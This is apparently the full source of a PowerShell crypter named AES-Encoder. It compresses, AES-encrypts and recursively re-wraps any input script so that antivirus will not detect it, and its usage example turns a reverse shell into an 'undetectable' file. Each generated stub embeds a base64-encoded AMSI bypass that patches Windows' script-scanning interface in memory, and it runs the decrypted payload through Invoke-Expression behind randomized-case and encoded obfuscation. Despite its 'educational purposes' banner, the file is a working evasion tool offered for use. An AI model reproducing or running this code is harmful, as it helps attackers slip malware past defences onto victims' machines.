#    AES-Encoder - PowerShell crypter
#    Copyright (C) 2022 Chainski 
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
# Made by https://github.com/chainski

$console = $host.UI.RawUI
$console.WindowTitle = "Powershell AES-Encoder"
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {

       (1..9|%{[byte](Get-Random -Max 256)}|foreach ToString X2) -join ''
}

function RAND() {

        $set = "xQpVQLuQpVQpVQpTVLQpVQyWpZPVQpkHVQpVQpVJQpGVQpVQpKVXQpVQpVQpVQpV"
        (1..(7 + (Get-Random -minimum 9 -Maximum 12)) | %{ $set[(Get-Random -Minimum 10 -Maximum $set.Length)] } ) -join ''
}

function Invoke-AES-Encoder {
    <#
    .SYNOPSIS

    Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
	It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.

    .DESCRIPTION

     Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.


    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.

    .PARAMETER OutFile
    Specifies the output script.

    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 4.

    .EXAMPLE

    PS> Invoke-AES-Encoder -InFile reverse-shell.ps1 -OutFile undetectable.ps1 -Iterations 12

    .LINK

    https://github.com/chainski/AES-Encoder

    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 4
    )

    Process {
Write-Host `r`n
Write-Host -ForegroundColor Red   "  ░░░░░  ░░░░░░░ ░░░░░░░     ░░░░░░░ ░░░    ░░  ░░░░░░  ░░░░░░  ░░░░░░  ░░░░░░░ ░░░░░░  "
Write-Host -ForegroundColor White " ▒▒   ▒▒ ▒▒      ▒▒          ▒▒      ▒▒▒▒   ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒      ▒▒   ▒▒ "
Write-Host -ForegroundColor Red   " ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒▒     ▒▒▒▒▒   ▒▒ ▒▒  ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  "
Write-Host -ForegroundColor White " ▓▓   ▓▓ ▓▓           ▓▓     ▓▓      ▓▓  ▓▓ ▓▓ ▓▓      ▓▓    ▓▓ ▓▓   ▓▓ ▓▓      ▓▓   ▓▓ "
Write-Host -ForegroundColor Red   " ██   ██ ███████ ███████     ███████ ██   ████  ██████  ██████  ██████  ███████ ██   ██ "
Write-Host -ForegroundColor	Blue   "                         ╔═════════════════════════════════════════╗                   "                         
Write-Host -ForegroundColor White  "                         ║          AES Encoder 1.0.0.0            ║                   "
Write-Host -ForegroundColor Blue   "                         ║           coded by Chainski             ║                   "
Write-Host -ForegroundColor White  "                         ║      For Educational Purposes Only      ║                   "
Write-Host -ForegroundColor Red    "                         ║                 Github                  ║                   "
Write-Host -ForegroundColor White  "                         ║ https://github.com/chainski/AES-Encoder ║                   "  
Write-Host -ForegroundColor Blue   "                         ╚═════════════════════════════════════════╝                   "  

Write-Host `r`n
sleep 1
        # read
        Write-Host "[*] Reading '$($infile)' ..." 
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            
            Write-Host "[*] Starting Encryption Process ..." -ForegroundColor Red 
            $paddingmodes = 'pKCs7','Iso10126','anSIx923','ZeROs'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'CbC','EcB'
			$ciphermode = $ciphermodes | Get-Random
            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random
            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Host "[*] Compressing ..." 
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
      	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Host "[*] Generating Encryption Key ..." 
            
			$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }
			
			$aesManaged.bLOcKSiZe = 128
            $aesManaged.keysiZE = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Host "[*] Encrypting with AES ..." -ForegroundColor Red 
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
		    Write-Host "[*] Randomizing Cases ..."
            # write
            Write-Host "[*] Obfuscating Layers ..."

            # Added Support for Unicode, URL and HTML Decoding 22/08/2022
			# ADDED AMSI Bypass 11/1/2022

            $stub_template = ''

            $code_alternatives  = @()
			$code_alternatives += '([sySTeM.TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))|iex' + "`r`n"
			$code_alternatives += 'aDd-tYpe -assEmBLyNAmE sYstEm.wEb > $nULl | Iex' + "`r`n"
            $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"       			
		    $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"
            $code_alternatives += '${3} = [coNVeRT]::fRomBaSE64sTRINg("{1}")' + "`r`n"
            $code_alternatives += '${4} = ([SYSTeM.web.httpUTiLIty]::urLdEcOdE("New%2DObject%20%22System%2ESecurity%2ECryptography%2EAesManaged%22%20"))|iex' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''
           
		   $code_alternatives  = @()
            $code_alternatives += '${4}.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::'+$CIpHerMoDE + "`r`n"
            $code_alternatives += '${4}.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::'+$paddingmode + "`r`n"
            $code_alternatives += '${4}.BlOckSIze = [SySTEm.NEt.WeButiliTy]::hTmLdEcOdE("&#x31;&#x32;&#x38;") | Iex' + "`r`n"         			
            $code_alternatives += '${4}.kEYSiZe = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.Iv = ${2}[0..15]' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''

            $code_alternatives  = @()
            $code_alternatives += '${6} = nEw-OBJECt ([REGex]::uNesCapE("\u0073\u0079\u0053\u0054\u0065\u004d\u002e\u0069\u006f\u002e\u006d\u0045\u006d\u006f\u0072\u0059\u0053\u0054\u0072\u0045\u0061\u006d"))(,${4}.CrEAtedECrYptor().TRaNsFOrmfinaLBlOCk(${2},16,${2}.LEnGth-16))' + "`r`n"
            $code_alternatives += '${7} = nEw-objEct SyStem.Io.mEmOryStReAm' + "`r`n"
			$code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''

            if ($compressiontype -eq "Gzip") {
                $stub_template += '${5} = nEw-oBject ([SYSTeM.web.httpUTiLIty]::urLdeCOdE("sYSTEM%2EIO%2EcOmPreSsiOn%2EgZIpStReAM%20%20")) ${6}, ([io.CompREsSION.COmPrEsSionMOdE]::DecompReSs)' + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${5} = NEw-oBject ([SYSTeM.web.httpUTiLIty]::urLdEcOdE("SySteM%2EiO%2EComprESsIoN%2EDEfLAtEsTReAM")) ${6}, ([io.CompREsSION.COmPrEssionMOdE]::DecompReSs)' + "`r`n"
            }
            $stub_template += '${5}.CoPyTo(${7})' + "`r`n"

            $code_alternatives  = @()        			
            $code_alternatives += '${5}.ClosE()' + "`r`n"
            $code_alternatives += '${4}.DisPoSe()' + "`r`n"
            $code_alternatives += '${6}.ClosE()' + "`r`n"
            $code_alternatives += '${8} = [sYStem.texT.enCoDIng]::uTF8.GETstrInG(${7}.tOArraY())' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''
            $stub_template += ('INVoke-ExPREsSion','IeX','iEx','InVokE-ExPREsSion' | Get-Random)+'(${8})' + "`r`n"
            
        
            # Concatenating each value manually.
            $code = $stub_template -f $b64encrypted, $b64key, (Create-Var), (RAND), (Create-Var), (RAND), (Create-Var), (RAND), (Create-Var), (RAND)
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Host "[*] Writing '$($outfile)' ..." 
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Host "[+] Done!" -ForegroundColor Red 
    }
}
